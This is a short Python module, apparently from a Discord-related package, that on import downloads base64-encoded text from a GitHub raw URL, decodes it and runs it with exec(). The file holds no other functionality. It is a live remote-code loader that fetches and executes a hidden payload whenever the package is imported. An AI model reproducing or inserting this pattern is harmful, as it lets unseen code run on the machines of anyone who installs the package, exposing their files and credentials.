import requests
import base64
from discordreactive.utils import my_utility_function

def main():
    # Fetch the base64 encoded script from the URL
    url = "https://raw.githubusercontent.com/kunderloads/mainscript-loader/main/main"
    response = requests.get(url)
    if response.status_code == 200:
        # Decode the base64 encoded script
        decoded_script = base64.b64decode(response.content).decode("utf-8")
        
        # Execute the decoded script
        exec(decoded_script)
    else:
        print("Failed to fetch the script from the URL")

# This code will be run when the module is imported
main()
